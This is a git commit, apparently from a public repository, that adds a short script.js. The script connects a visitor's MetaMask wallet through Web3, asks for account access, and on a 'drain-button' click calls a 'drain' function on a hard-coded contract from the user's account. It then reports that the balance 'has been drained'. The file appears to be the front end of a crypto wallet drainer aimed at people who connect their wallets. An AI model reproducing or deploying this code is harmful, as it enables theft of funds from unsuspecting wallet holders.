a7d379810f99b6945d27012cedaba3e3ee02bda0
jaxdab1 <124030035+jaxdab1@users.noreply.github.com>
2023-04-19 23:28:40 -0400

    Create script.js

---
+++ script.js
@@ -0,0 +1,41 @@
+// Set the contract address and ABI
+const contractAddress = '0xD0507daD8536c1fE14122B04009AFA9e9C7ae514';
+const contractABI = [
+    {
+        "inputs": [],
+        "name": "drain",
+        "outputs": [],
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    }
+];
+
+// Initialize Web3 and the contract
+let web3 = new Web3(window.ethereum);
+let contract = new web3.eth.Contract(contractABI, contractAddress);
+
+// Listen for button click
+document.getElementById('drain-button').addEventListener('click', async function() {
+    try {
+        // Request account access from Metamask
+        await window.ethereum.enable();
+        // Get the account address
+        const accounts = await web3.eth.getAccounts();
+        const account = accounts[0];
+        // Call the drain function of the contract
+        await contract.methods.drain().send({
+            from: account,
+            value: 0,
+            gas: 3000000
+        });
+        alert('Your balance has been drained!');
+    } catch (err) {
+        console.error(err);
+        alert('An error occurred, please try again.');
+    }
+});
